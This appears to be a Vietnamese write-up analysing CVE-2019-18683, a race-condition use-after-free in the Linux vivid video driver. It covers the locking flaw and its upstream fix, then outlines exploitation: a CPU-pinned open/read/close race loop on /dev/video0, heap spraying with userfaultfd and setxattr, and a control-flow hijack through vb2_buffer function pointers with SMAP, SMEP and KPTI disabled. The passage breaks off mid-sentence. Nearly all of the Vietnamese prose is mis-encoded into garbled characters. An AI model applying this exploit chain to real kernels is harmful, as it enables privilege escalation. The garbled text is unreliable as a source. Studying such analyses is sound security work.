--\u0026gt; vb2_fop_read\rvb2_fop_read --\u0026gt; __vb2_perform_fileio\r__vb2_perform_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; vb_queue_alloc\r__vb2_perform_fileio --\u0026gt; vb2_core_qbuf\r__vb2_perform_fileio --\u0026gt; vb2_core_streamon\rvb2_core_streamon --\u0026gt; vb2_start_streaming\rvb2_start_streaming --\u0026gt; __enqueue_in_driver\rvb2_start_streaming --\u0026gt; vbi_cap_start_streaming\r__vb2_perform_fileio --\u0026gt; vb2_core_dqbuf vb2_queue: hÃ ng Ä‘á»£i nÃ y sáº½ chá»©a vb2_buffer cá»§a á»©ng dá»¥ng, Ä‘Æ°á»£c lÆ°u á»Ÿ `vb2_queue-\u0026gt;bufs) vb2_buffer: lÆ°u thÃ´ng tin vá» cÃ¡c hoáº¡t Ä‘á»™ng cá»§a video stream. Khi lá»‡nh read thá»±c hiá»‡n, nÃ³ gá»i vb_queue_alloc Ä‘á»ƒ cáº¥p phÃ¡t vÃ¹ng nhá»› (kmalloc-1k) Ä‘á»ƒ chá»©a nhá»¯ng thÃ´ng tin tá»« vb2_buffer vÃ  sau Ä‘Ã³ láº¥y nhá»¯ng thÃ´ng tin nÃ y ra Ä‘á»ƒ thá»±c hiá»‡n. QuÃ¡ trÃ¬nh data streaming thá»±c cháº¥t lÃ  quÃ¡ trÃ¬nh viáº¿t vÃ  Ä‘á»c tá»« buffer vb2_buffer Ä‘Æ°á»£c thÃªm vÃ o vb2_queue (vb2_queue-\u0026gt;queued_list) Äiá»u chÃº Ã½ á»Ÿ Ä‘Ã¢y, khÃ³a dev-\u0026gt;mutex cá»§a vb2_fop_read vÃ  khÃ³a táº¡i vb2_queue-\u0026gt;lock lÃ  má»™t khÃ³a. xem hiá»‡n thá»±c táº¡i Ä‘Ã¢y Sau khi vb_buffer Ä‘Æ°á»£c thÃªm vÃ o hÃ ng Ä‘á»£i, chÆ°Æ¡ng trÃ¬nh sáº½ báº¯t Ä‘áº§u streaming, gá»i vb2_start_streaming Ä‘á»ƒ Ä‘Æ°a dá»¯ liá»‡u vÃ o vb_buffer. QuÃ¡ trÃ¬nh nÃ y nÃ³ sáº½ gá»i __enqueue_in_driver Ä‘á»ƒ thÃªm buffer vÃ o vivid_dev, hÃ ng Ä‘á»£i vid_cap_active Ä‘á»ƒ Ä‘Æ°á»£c xá»­ lÃ­. QuÃ¡ trÃ¬nh trÃªn tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i viá»‡c gá»i hÃ m vid_cap_buf_queue 1 2 3 4 5 6 7 8 9 10 static void vid_cap_buf_queue(struct vb2_buffer *vb) { struct vb2_v4l2_buffer *vbuf = to_vb2_v4l2_buffer(vb); struct vivid_dev *dev = vb2_get_drv_priv(vb-\u0026gt;vb2_queue); struct vivid_buffer *buf = container_of(vbuf, struct vivid_buffer, vb); spin_lock(\u0026amp;dev-\u0026gt;slock); list_add_tail(\u0026amp;buf-\u0026gt;list, \u0026amp;dev-\u0026gt;vid_cap_active);// spin_unlock(\u0026amp;dev-\u0026gt;slock); } Sau Ä‘Ã³ gá»i vid_cap_start_streaming, hÃ m nÃ y sáº½ gá»i vivid_start_generating_vid_cap Ä‘á»ƒ khá»Ÿi táº¡o 1 kernel thread thá»±c hiá»‡n hÃ m vivid_thread_vid_caption\n1 2 dev-\u0026gt;kthread_vid_cap = kthread_run(vivid_thread_vid_cap, dev, \u0026#34;%s-vid-cap\u0026#34;, dev-\u0026gt;v4l2_dev.name); HÃ m vivid_thread_vid_cap nÃ y cÃ³ nhiá»‡m vá»¥ Ä‘Æ°a dá»¯ liá»‡u vÃ o vb2_buffer. Sau dá»¯ liá»‡u Ä‘Æ°á»£c Ä‘Æ°a xong, nÃ³ sáº½ bÆ°á»›c vÃ²ng 1 vÃ²ng láº·p vÃ´ háº¡n, ngá»“i Ä‘á»£i láº¥y khÃ³a lock(mutex_lock(\u0026amp;dev-\u0026gt;mutex)), khi nháº­n Ä‘Æ°á»£c khÃ³a, dá»¯ liá»‡u trÃªn vb2_buffer má»›i Ä‘Æ°á»£c xá»­ lÃ­. NhÆ° Ä‘Ã£ nÃ³i, vb2_fop_read cÅ©ng cÃ³ khÃ³a, vÃ  khÃ³a nÃ y vá»›i khÃ³a á»Ÿ bÆ°á»›c trÃªn vivid_thread_vid_cap lÃ  má»™t, Ä‘iá»u nÃ y cÃ³ nghÄ©a, khi thread Ä‘ang thá»±c hiá»‡n vivid_thread_vid_cap má»Ÿ khÃ³a, má»™t thread nÃ o Ä‘Ã³ thá»±c hiá»‡n vb2_fop_read cÃ³ khÃ³a, nÃ³ cÃ³ thá»ƒ vÃ o vÃ¹ng nhá»› nÃ y Ä‘á»ƒ thá»±c hiá»‡n. Giá»‘ng nhÆ° ngÃ´i nhÃ  chá»‰ cÃ³ thá»ƒ chÆ°a 1 ngÆ°á»i, cÃ³ 2 ngÆ°á»i giá»¯ chÃ¬a khÃ³a, khi 1 ngÆ°á»i bÃªn trong Ä‘i ra, ngÆ°á»i cÃ²n láº¡i náº¿u Ä‘ang giá»¯ chÃ¬a khÃ³a, anh ta hoÃ n toÃ n cÃ³ thá»ƒ vÃ o cÄƒn nhÃ . CÄƒn nhÃ  á»Ÿ Ä‘Ã¢y lÃ  vb2_buf, cÃ²n 2 ngÆ°á»i láº§n lÆ°á»£t lÃ  2 thread Ä‘ang cháº¡y vivid_thread_vid_cap vÃ  vb2_fop_read.\nNhÆ°ng táº¡i sao Ä‘ang giá»¯ khÃ³a rá»“i láº¡i má»Ÿ khÃ³a, sau Ä‘Ã³ láº¡i chá» cÃ³ láº¡i khÃ³a, tÃ´i váº«n chÆ°a hiá»ƒu táº¡i sao láº¡i nhÆ° tháº¿, nhÆ°ng Ä‘Ã¢y chÃ­nh lÃ  nguyÃªn nhÃ¢n gÃ¢y ra CVE nÃ y. Quan sÃ¡t kÄ© hÆ¡n vá» hÃ m vb2_core_dqbuf: stateDiagram\rvb2_core_dqbuf --\u0026gt; __vb2_get_done_vb\r__vb2_get_done_vb --\u0026gt; __vb2_wait_for_done_vb\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_prepare\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_finish á» Ä‘Ã¢y, vb2_ops_wait_prepare sáº½ tráº£ khÃ³a vb2_queue-\u0026gt;lock, vb2_ops_wait_finish sáº½ chá» nháº­n khÃ³a vÃ  káº¿t thÃºc.\nHay nÃ³i cÃ¡ch khÃ¡c, vb2_core_dqbuf sáº½ tráº£ khÃ³a, vivid_thread_vid_cap cÃ³ khÃ³a sáº½ vÃ o thá»±c hiá»‡n, vb2_core_dqbuf pháº£i chá» vivid_thread_vid_cap thá»±c hiá»‡n xong, Ä‘Æ°a láº¡i khÃ³a rá»“i má»›i hoÃ n táº¥t viá»‡c cá»§a mÃ¬nh.\nVáº¥n Ä‘á» chÃ­nh lÃ  á»Ÿ bÆ°á»›c nÃ y. giá»‘ng nhÆ° viá»‡c báº¡n mÆ°á»£n phÃ²ng trong vÃ²ng 45\u0026rsquo; rá»“i báº¡n pháº£i khÃ³a phÃ²ng, Ä‘em chÃ¬a khÃ³a xuá»‘ng cho báº£o vá»‡ Ä‘á»ƒ báº£o vá»‡ lÃªn kiá»ƒm tra, báº£o vá»‡ kiá»ƒm tra xong sáº½ Ä‘Æ°a láº¡i chÃ¬a khÃ³a cho báº¡n Ä‘á»ƒ báº¡n vÃ o phÃ²ng tiáº¿p. NhÆ°ng trong quÃ¡ trÃ¬nh báº¡n Ä‘em chÃ¬a khÃ³a xuá»‘ng cho báº£o vá»‡ thÃ¬ 1 ngÆ°á»i khÃ¡c cÃ³ Ä‘Æ°á»£c chiáº¿c chÃ¬a khÃ³a nÃ y, há» hoÃ n toÃ n cÃ³ thá»ƒ vÃ o phÃ²ng lÃºc nÃ y. KÃ¬ vá»ng cá»§a ngÆ°á»i láº­p trÃ¬nh lÃ  muá»‘n vivid_thread_vid_cap Ä‘i vÃ o khi vb2_core_dqbuf tráº£ khÃ³a, nhÆ°ng lÃºc nÃ y, náº¿u 1 process khÃ¡c Ä‘ang cháº¡y vÃ  gá»i vb2_fop_read thÃ¬ há» sáº½ cÃ³ Ä‘Æ°á»£c chÃ¬a khÃ³a nÃ y.\nBÃªn dÆ°á»›i lÃ  áº£nh khi debug, cÃ³ thá»ƒ tháº¥y máº·c dÃ¹ hÃ m vivid_thread_vid_cap Ä‘Ã£ thá»±c thi xong háº¿t rá»“i vb2_fop_read khÃ´ng káº¿t thÃºc ngay, nÃ³ láº¡i gá»i vb2_core_qbuf má»™t láº§n ná»¯a. Khi Ä‘Ã³, hÃ m nÃ y láº¡i vÃ o Ä‘á»c dá»¯ liá»‡u mÃ  vá»‘n dÄ© Ä‘Ã  Ä‘Æ°á»£c thá»±c hiá»‡n xong bá»Ÿi 1 process khÃ¡c. Khi nÃ³ gá»i __enqueue_in_driver, vb2_buffer sáº½ Ä‘Æ°á»£c thÃªm vÃ o hÃ ng Ä‘á»£i dev-\u0026gt;vid_cap_active Ä‘á»ƒ thá»±c hiá»‡n. Sau Ä‘Ã³ vb2_fop_read má»›i káº¿t thÃºc. Äiá»u nÃ y dáº«n tá»›i, sau khi vb2_fop_read káº¿t thÃºc, thÃ¬ Ä‘á»‹a vb2_buffer láº¡i Ä‘Æ°á»£c lÆ°u trong dev-\u0026gt;vid_cap_active Ä‘á»ƒ chuáº©n bá»‹ cho 1 process khÃ¡c thá»±c hiá»‡n. Khi tÃ¬m hiá»ƒu vá» dev-\u0026gt;vid_cap_active thÃ¬ tÃ´i tháº¥y nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi 3 hÃ m: vivid_thread_vid_cap, vid_cap_start_streaming vÃ  vivid_stop_generating_vid_cap. vivid_thread_vid_cap: láº¥y táº¥t cáº£ dá»¯ liá»‡u trong hÃ ng Ä‘á»£i vid_cap_active ra, do Ä‘Ã³, sau khi thá»±c hiá»‡n xong, buffer sáº½ khÃ´ng cÃ²n trong hÃ ng Ä‘á»£i. vid_cap_start_streaming má»¥c Ä‘Ã­ch chÃ­nh lÃ  kiá»ƒm tra xem tráº¡ng thÃ¡i cá»§a buffer vÃ  thá»±c hiá»‡n má»™t sá»‘ chuyá»ƒn Ä‘á»•i, sau khi thá»±c hiá»‡n xong, buffer váº«n cÃ²n trong hÃ ng Ä‘á»£i. vivid_stop_generating_vid_cap Ä‘Æ°á»£c dÃ¹ng trong hÃ m close(fd), dÃ¹ng Ä‘á»ƒ xÃ³a táº¥t cáº£ cÃ¡c dá»¯ liá»‡u trong hÃ ng Ä‘á»£i, bao gá»“m cáº£ buffer. close ChÃºng ta Ä‘Ã£ tÃ¬m hiá»ƒu vá» hÃ m read vÃ  tháº¥y ráº±ng sau khi thá»±c hiá»‡n hÃ m read, vb2_buffer láº¡i Ä‘Æ°á»£c 1 process khÃ¡c Ä‘Æ°a vÃ o hÃ ng Ä‘á»£i Ä‘á»ƒ chuáº©n bá»‹ cho quÃ¡ trÃ¬nh thá»±c hiá»‡n. Váº­y khi process hiá»‡n táº¡i thá»±c hiá»‡n xong lá»‡nh close thÃ¬ vb2_buffer sáº½ bá»‹ áº£nh hÆ°á»Ÿng nhÆ° tháº¿ nÃ o? ChÃºng ta hÃ£y cÃ¹ng xem flow khi gá»i hÃ m close\nstateDiagram\rvivid_fop_release --\u0026gt; vb2_fop_release\rvb2_fop_release --\u0026gt; vb2_queue_release\rvb2_queue_release --\u0026gt; vb2_core_queue_release\rvb2_core_queue_release --\u0026gt; __vb2_cleanup_fileio\r__vb2_cleanup_fileio --\u0026gt; vb2_core_streamoff\rvb2_core_streamoff --\u0026gt; __vb2_queue_cancel\r__vb2_queue_cancel --\u0026gt; vivid_stop_generating_vid_cap\r__vb2_cleanup_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; __vb2_queue_free NhÃ¬n vÃ o lÆ°á»£c Ä‘á»“ trÃªn, ta tháº¥y khÃ¡ Ä‘Æ¡n giáº£n, tuy nhiÃªn cÃ³ má»™t chÃº Ã½:\nHÃ m vivid_stop_generating_vid_cap tráº£ khÃ³a, rá»“i gá»i kthread_stop Ä‘á»ƒ dá»«ng kernel thread Ä‘ang thá»±c hiá»‡n hÃ m vivid_thread_vid_cap.\nNáº¿u nhÆ° káº¿t thÃºc hÃ m read() nÃ³ chá»‰ táº¡o ra má»™t nguy cÆ¡ xáº£y ra lá»—i uaf, thÃ¬ táº¡i Ä‘Ã¢y chÃ­nh lÃ  nguyÃªn nhÃ¢n gÃ¢y ra lá»—i uaf. 1 2 3 4 mutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; mutex_lock(\u0026amp;dev-\u0026gt;mutex); Sau khi vivid_stop_generating_vid_cap thá»±c hiá»‡n xong, nÃ³ sáº½ gá»i hÃ m __vb2_queue_free Ä‘á»ƒ giáº£i phÃ³ng vb2_queue-\u0026gt;bufs vÃ  vb2_buffer, rÃ²i Ä‘Ã³ng process hiá»‡n táº¡i. Äá»«ng quÃªn ráº±ng, vb2_buffer ngay lÃºc nÃ y Ä‘ang Ä‘Æ°á»£c 1 process khÃ¡c Ä‘Æ°a vÃ o hÃ ng Ä‘á»£i vid_cap_active Ä‘á»ƒ chuáº©n bá»‹ thá»±c thi. Äiá»u nÃ y dáº«n tá»›i lá»—i UAF\nBugs and Fixes TÃ¡c giáº£ sá»­ dá»¥ng skyzkaller fuzzer vá»›i nhá»¯ng tÃ¹y chá»‰nh trong kernel source code vÃ  tháº¥y nhá»¯ng crash trong kernel. KASAN phÃ¡t hiá»‡n ra lá»—i use-after-free trong cÃ¡c thao tÃ¡c danh sÃ¡ch liÃªn káº¿t trong vid_cap_buf_queue(). NguyÃªn nhÃ¢n lÃ  do sá»± sai sÃ³t trong quÃ¡ trÃ¬nh sá»­ dá»¥ng khÃ³a (mutex lock) trong vivid_stop_generating_vid_cap(), vivid_stop_generating_vid_out() vÃ  sdr_cap_stop_streaming(). Nhá»¯ng hÃ m trÃªn Ä‘Æ°á»£c gá»i khi bá»‹ khÃ³a vivid_dev.mutex, quÃ¡ trÃ¬nh streaming bá»‹ dá»«ng. ChÃºng cÃ¹ng máº¯c pháº£i má»™t lá»—i lÃ  khi muá»‘n dá»«ng kthreads thÃ¬ nÃ³ cÅ©ng cáº§n pháº£i khÃ³a mutex nÃ y. VÃ­ dá»¥, trong hÃ m vivid_stop_generating_vid_cap(): 1 2 3 4 5 6 /* shutdown control thread */ vivid_grab_controls(dev, false); mutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; mutex_lock(\u0026amp;dev-\u0026gt;mutex); Tuy nhiÃªn, khi mutex Ä‘Æ°á»£c unlocked, má»™t hÃ m khÃ¡c vb2_fop_read() cÃ³ thá»ƒ khÃ³a nÃ³ thay vÃ¬ kthread vÃ  thao tÃ¡c trÃªn hÃ ng Ä‘á»£i (buffer queue). Äiá»u nÃ y dáº«n tá»›i kháº£ nÄƒng xáº£y ra use-after-free sau nÃ y khi streaming hoáº¡t Ä‘á»™ng trá»Ÿ láº¡i.\nchÆ°a biáº¿t cÃ¡ch sá»­ dá»¥ng skyzkaller fuzzer.\nVÃ¬ sao dáº«n tá»›i kháº£ nÄƒng xáº£y ra use-after-free? (Ä‘Ã£ tráº£ lá»i trong cÆ¡ cháº¿ hÃ m read, close trong vivid)\rÄá»ƒ giáº£i quyáº¿t tÃ¬nh tráº¡ng trÃªn, tÃ¡c giáº£ Ä‘á» xuáº¥t nhÆ° sau: KhÃ´ng má»Ÿ khÃ³a mutex khi stream dá»«ng. VÃ­ dá»¥ á»Ÿ hÃ m vivid_stop_generating_vid_cap() chÃºng ta sáº½ bá» 2 hÃ m: 1 2 3 4 5 6 /* shutdown control thread */ vivid_grab_controls(dev, false); -\tmutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; -\tmutex_lock(\u0026amp;dev-\u0026gt;mutex); Sá»­ dá»¥ng mutex_trylock() vá»›i schedule_timeout_uninterruptible() trong vÃ²ng láº·p cá»§a vivid kthread handler. HÃ m xá»­ lÃ­ vivid_thread_vid_cap() Ä‘Æ°á»£c thay Ä‘á»•i nhÆ° sau: 1 2 3 4 5 6 7 8 9 10 11 for (;;) { try_to_freeze(); if (kthread_should_stop()) break; -\tmutex_lock(\u0026amp;dev-\u0026gt;mutex); +\tif (!mutex_trylock(\u0026amp;dev-\u0026gt;mutex)) { +\tschedule_timeout_uninterruptible(1); +\tcontinue; +\t} ... } Náº¿u mutex nÃ y khÃ´ng hoáº¡t Ä‘á»™ng, kthread sáº½ ngá»§ trong giÃ¢y lÃ¡t rá»“i thá»­ láº¡i. Trong trÆ°á»ng há»£p xáº¥u nháº¥t, kthread sáº½ ngá»§ vÃ i láº§n vÃ  cháº¡m Ä‘áº¿n break Ä‘á»ƒ thoÃ¡t khá»i vÃ²ng láº·p hiá»‡n táº¡i.\nWinning the race ChÃºng ta Ä‘Ã£ hiá»ƒu táº¡i sao láº¡i vivid láº¡i cÃ³ thá»ƒ dáº«n tá»›i lá»—i UAF, bÃ¢y giá» chÃºng ta sáº½ tiáº¿n hÃ nh khai thÃ¡c lá»—i nÃ y. Äá»ƒ test kernel, chÃºng ta cáº§n Ä‘áº£m báº£o: ÄÃ£ cÃ³ vivid driver /dev/video0 is the V4L2 capture device ChÃºng ta Ä‘Ã£ login ChÃºng ta táº¡o 2 pthreads. TrÆ°á»ng há»£p nÃ y, báº¯t buá»™c sá»­ dá»¥ng ched_setaffinity Ä‘á»ƒ racing tá»‘t hÆ¡n. 1 2 3 4 5 6 7 cpu_set_t single_cpu; CPU_ZERO(\u0026amp;single_cpu); CPU_SET(cpu_n, \u0026amp;single_cpu); ret = sched_setaffinity(0, sizeof(single_cpu), \u0026amp;single_cpu); if (ret != 0) err_exit(\u0026#34;[-] sched_setaffinity for a single CPU\u0026#34;); ChÃºng ta tiáº¿n hÃ nh race 1 2 3 4 5 6 7 8 9 10 for (loop = 0; loop \u0026lt; LOOP_N; loop++) { int fd = 0; fd = open(\u0026#34;/dev/video0\u0026#34;, O_RDWR); if (fd \u0026lt; 0) err_exit(\u0026#34;[-] open /dev/video0\u0026#34;); read(fd, buf, 0xfffded); close(fd); } Khai báº¯t Ä‘áº§u streaming hÃ m vid_cap_start_streaming() sáº½ , Ä‘Æ°á»£c gá»i bá»Ÿi V4L2 trong khi vb2_core_streamon() Ä‘á»c tá»« file descriptor. Khi dá»«ng streaming, hÃ m vivid_stop_generating_vid_cap() sáº½ Ä‘Æ°á»£c V4L2 gá»i trong khi __vb2_queue_cancel() sáº½ giáº£i phÃ³ng tham kháº£o cuá»‘i cÃ¹ng Ä‘áº¿n file. Do Ä‘Ã³, náº¿u má»™t trÃ¬nh Ä‘á»c khÃ¡c \u0026ldquo;chiáº¿n tháº¯ng\u0026rdquo; kthreads, nÃ³ sáº½ gá»i vb2_core_qbuf(), hÃ m nÃ y sáº½ thÃªm vb2_buffer vÃ o vb2_queue.queued_list. Khi cháº¡y Ä‘oáº¡n code trÃªn, chÃºng ta cÃ³ thá»ƒ sáº½ Ä‘Æ°á»£c káº¿t quáº£ nhÆ° sau:\nTa cÃ³ 2 thread cháº¡y trÃªn 2 CPU khÃ¡c nhau, mÃ u Ä‘á» Ä‘áº¡i diá»‡n thread A, mÃ u xanh Ä‘áº¡i diá»‡n thread B Thread A Thread B Cháº¡y vb2_core_dqbuf, tráº£ khÃ³a (giáº£ sá»­ vivid_thread_vid_cap Ä‘Ã£ cÃ³ khÃ³a) vb2_fop_read láº¥y Ä‘Æ°á»£c khÃ³a, thá»±c hiá»‡n vÃ  cÃ³ váº» khÃ´ng thá»a mÃ£n Ä‘iá»u kiá»‡n nÃ o Ä‘Ã³ nÃªn dá»«ng, tráº£ khÃ³a láº¡i vivid_thread_vid_cap nháº­n Ä‘Æ°á»£c khÃ³a, giáº£i phÃ³ng buffer thá»±c hiá»‡n hÃ m close(fd), gá»i hÃ m vivid_stop_genrating_vid_cap Ä‘á»ƒ xÃ³a hÃ ng Ä‘á»£i vid_cap_active ra khá»i thiáº¿t bá»‹, tráº£ khÃ³a (hi vá»ng vivid_thread_vid_cap sáº½ láº¥y Ä‘Æ°á»£c khÃ³a nÃ y) vb_core_dqbuf láº¥y Ä‘Æ°á»£c khÃ³a, gá»i __enqueue_in_driver Ä‘á»ƒ thÃªm vb2_buffer vÃ o hÃ ng Ä‘á»£i. Thá»±c hiá»‡n lá»‡nh read vÃ  giáº£i phÃ³ng khÃ³a vivid_stop_generating_vid_cap nháº­n Ä‘Æ°á»£c khÃ³a vÃ  thá»±c hiá»‡n lá»‡nh close(fd) Ä‘á»ƒ Ä‘Ã³ng process vÃ  giáº£i phÃ³ng vÃ¹ng nhá»› vb2_buffer, vÃ¹ng nhá»› nÃ y váº«n cÃ²n náº±m trong hÃ ng Ä‘á»£i vid_cap_active, vÃ  cÃ³ thá»ƒ Ä‘Æ°á»£c dÃ¹ng cho láº§n Ä‘á»c tiáº¿p teho -\u0026gt; lá»—i UAF BÆ°á»›c vÃ o vÃ²ng láº·p má»›i, Ä‘á»£i cÃ³ khÃ³a Ä‘á»ƒ gá»i vivid_thread_vid_cap Ä‘á»ƒ Ä‘Æ°a vÃ¹ng nhá»› vb2_buffer cÅ© vá»«a bá»‹ kfree vÃ o vivid_fillbuff vÃ¬ vÃ¹ng nhá»› bá»‹ kfree nÃªn sáº½ bá»‹ xÃ³a Ä‘i nhá»¯ng trÆ°á»ng cáº§n thiáº¿t cho quÃ¡ trÃ¬nh thá»±c hiá»‡n, nÃªn sau Ä‘Ã³ chÆ°Æ¡ng trÃ¬nh sáº½ bá»‹ crash Deceived V4L2 sub system Khi streaming dá»«ng háº³n, tham kháº£o cuá»‘i cÃ¹ng tá»›i /dev/video0 Ä‘Æ°á»£c giáº£i phÃ³ng, V4L2 subsystem calls sáº½ gá»i vb2_core_queue_release() Ä‘á»ƒ giáº£i phÃ³ng tÃ i nguyÃªn. Há»‡ thá»‘ng sáº½ láº§n lÆ°á»£t gá»i __vb2_queue_free() Ä‘á»ƒ giáº£i phÃ³ng vb2_buffer - Ä‘Ã£ Ä‘Æ°á»£c thÃªm vÃ o hÃ ng Ä‘á»£i khi mÃ  exploit cáº£u chÃºng ta tháº¯ng race.\nTuy nhiÃªn, driver khÃ´ng biáº¿t Ä‘iá»u Ä‘Ã³ vÃ  váº«n giá»¯ tham kháº£o Ä‘áº¿n má»™t object Ä‘Ã£ Ä‘Æ°á»£c giáº£i phÃ³ng. Khi stream báº¯t Ä‘áº§u láº¡i, nÃ³ sáº½ nháº£y vÃ o exploit loop, vivid driver sáº½ cháº¡m Ä‘áº¿n Ä‘á»‘i tÆ°á»£ng bá»‹ giáº£i phÃ³ng vÃ  Ä‘iá»u nÃ y Ä‘Ã£ Ä‘Æ°á»£c KASAN phÃ¡t hiá»‡n. Heap spraying Heap spraying lÃ  kÄ© thuáº­t, má»¥c Ä‘Ã­ch Ä‘áº·t nhá»¯ng controlled bytes vÃ o nhá»¯ng vá»‹ trÃ­ cÃ³ thá»ƒ xÃ¡c Ä‘á»‹nh trÆ°á»›c trÃªn heap. KÄ© thuáº­t nÃ y thÆ°á»ng liÃªn quan tá»›i viá»‡c cáº¥p phÃ¡t nhiá»u Ä‘á»‘i tÆ°á»£ng trÃªn heap vá»›i controlled contents vÃ  lÃ m sao Ä‘á»ƒ má»™t sá»‘ allocator Ä‘á»ƒ cáº¥p phÃ¡t ngay vÃ¹ng nhá»› trÃªn. Heap spraying sá»­ dá»¥ng Ä‘á»ƒ khai thÃ¡c use-after-free trong Linux Kernel sáº½ thÆ°á»ng dÃ¹ng kmalloc() vÃ¬ hÃ m nÃ y sáº½ tráº£ vá» Ä‘á»‹a chá»‰ cá»§a vÃ¹ng nhá»› vá»«a Ä‘Æ°á»£c free. Do Ä‘Ã³, náº¿u cáº¥p phÃ¡t má»™t Ä‘á»‘i tÆ°á»£ng, cÃ¹ng Ä‘á»‹a chá»‰ vá»›i controlled contents sáº½ cho phÃ©p chÃºng ta ghi Ä‘Ã¨ vÃ¹ng nhá»› cÃ³ thá»ƒ khai thÃ¡c.\náº¢nh tham kháº£o tá»«: https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html KÄ© thuáº­t nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c triá»ƒn khai báº±ng cÃ¡ch sá»­ dá»¥ng káº¿t há»£p userfaultfd() + setxattr() vá»›i Ã½ tÆ°á»Ÿng chÃ­nh ráº±ng userfaultfd() sáº½ cho phÃ©p chÃºng ta kiá»ƒm soÃ¡t Ä‘Æ°á»£c lifetime cá»§a dá»¯ liá»‡u Ä‘Æ°á»£c cáº¥p phÃ¡t bá»Ÿi setxattr() trong kernelspace. Quay trá»Ÿ vá» vá»›i lá»— há»•ng nÃ y, vb2_buffer sáº½ Ä‘Æ°á»£c free khi streaming dá»«ng vÃ  sáº½ Ä‘Æ°á»£c use á»Ÿ láº§n streaming tiáº¿p theo. Do Ä‘Ã³, náº¿u chÃºng ta sá»­ dá»¥ng kÄ© thuáº­t heap spraying vÃ o cuá»‘i vÃ²ng láº·p thá»© nháº¥t trÆ°á»›c khi streaming stop thÃ¬ khi streaming báº¯t Ä‘áº§u á»Ÿ vÃ²ng láº·p káº¿ tiáº¿p thÃ¬ chÃºng ta cÃ³ thá»ƒ dÃ¹ng kmalloc() Ä‘á»ƒ cáº¥p phÃ¡t vÃ¹ng nhá»› vá»«a free á»Ÿ cuá»‘i vÃ²ng láº·p trÆ°á»›c vá»›i controlled data. Tuy nhiÃªn, lÃºc báº¥y giá», tÃ¡c giáº£ phÃ¡t hiá»‡n ra má»™t váº¥n Ä‘á»: vÃ¹ng nhá»› vb2_buffer khÃ´ng pháº£i lÃ  vÃ¹ng nhá»› cuá»‘i cÃ¹ng Ä‘Æ°á»£c giáº£i phÃ³ng bá»Ÿi __vb2_queue_free(), do Ä‘Ã³, á»Ÿ vÃ²ng láº·p tiáº¿p theo, khi gá»i kmalloc) thÃ¬ nÃ³ sáº½ khÃ´ng tráº£ vá» Ä‘Ãºng Ä‘á»‹a chá»‰ mÃ  chÃºng ta cáº§n. VÃ¬ tháº¿, chÃºng ta cáº§n pháº£i allocate nhiá»u láº§n Ä‘á»ƒ cÃ³ thá»ƒ cáº¥p phÃ¡t Ä‘Ãºng Ä‘Æ°á»£c vá»‹ trÃ­ mong muá»‘n. NhÆ°ng muá»‘n Ã¡p dá»¥ng Ä‘iá»u trÃªn vá»›i hai hÃ m userfaultfd() + setxattr() lÃ  khÃ´ng dá»… dÃ ng vÃ¬: dá»¯ liá»‡u do setxattr() cáº¥p phÃ¡t chá»‰ tá»“n táº¡i cho Ä‘áº¿n khi trÃ¬nh xá»­ lÃ­ lá»—i trang userfaultfd() gá»i hÃ m ioctl vá»›i flag UFFDIO_COPY. Hay nÃ³i cÃ¡ch khÃ¡c, muá»‘n dá»¯ liá»‡u Ä‘Æ°á»£c cáº¥p phÃ¡t bá»Ÿi setxattr() khÃ´ng bá»‹ máº¥t thÃ¬ userfaultfd() khÃ´ng gá»i ioctl. TÃ¡c giáº£ giáº£i quyáº¿t váº¥n Ä‘á» nÃ y báº±ng cÃ¡ch táº¡o ra má»™t pool of threads: má»—i thread nÃ y Ä‘Æ°á»£c gá»i lÃ  spraying thread, gá»i hÃ m setxattr() Ä‘Æ°á»£c xá»­ lÃ­ bá»Ÿi userfaultfd() vÃ  lÆ°u dá»¯ liá»‡u Ä‘Æ°á»£c cáº¥p phÃ¡t. TÃ´i váº«n chÆ°a biáº¿t tÃ¢t cáº£ cÃ¡c spraying thread Ä‘á»u Ä‘Æ°á»£c xá»­ lÃ­ bá»Ÿi userfaultfd() hay má»—i spraying thread sáº½ cÃ³ 1 userfaultfd() tÆ°Æ¡ng á»©ng (sáº½ Ä‘Æ°á»£c giáº£i thÃ­ch á»Ÿ nhá»¯ng má»¥c dÆ°á»›i)\rBÃ¢y giá», chÃºng ta sáº½ viáº¿t payload gÃ¬ vÃ o vb2_buffer?\nControl flow hijack for V4L2 subsystem LÆ°á»£c Ä‘á»“ dÆ°á»›i Ä‘Ã¢y Ä‘áº·c táº£ sÆ¡ lÆ°á»£c má»‘i quan há»‡ giá»¯a cÃ¡c object trong V4L2 subsystem\nTáº¡i Ä‘Ã¢y thÃ¬ tÃ¡c giáº£ báº£o Ã´ng áº¥y tá»‘n khÃ¡ nhiá»u thá»i gian Ä‘á»ƒ tÃ¬m cÃ¡ch ghi ná»™i dung tÃ¹y Ã½ vÃ o vb2_buffer vÃ  báº±ng má»™t cÃ¡ch tháº§n ká»³ nÃ o Ä‘Ã³, Ã´ng ta Ä‘Ã£ tÃ¬m ra con Ä‘Æ°á»ng nhÆ° trÃªn lÆ°á»£c Ä‘á»“:\nvb2_buffer.vb2_queue-\u0026gt;mem_ops-\u0026gt;vaddr\nDá»… tháº¥y, hÃ m vaddr() nháº­n vb2_buffer.planes[0].mem_priv lÃ m tham sá»‘.\nUnexpected troubles: kthread context ChÃºng ta báº¯t Ä‘áº§u viáº¿t nhá»¯ng payload Ä‘á»ƒ V4L2 cháº¡m tá»›i con trá» hÃ m nÃ y. Táº¯t SMAP (Supervisor Mode Access Prevention), SMEP (Supervisor Mode Execution Prevention), KPTI (Kernel Page-Table Isolation) LÃ m vb2_buffer.vb2_queue trá» tá»›i má»™t vÃ¹ng nhá»› Ä‘Æ°á»£c 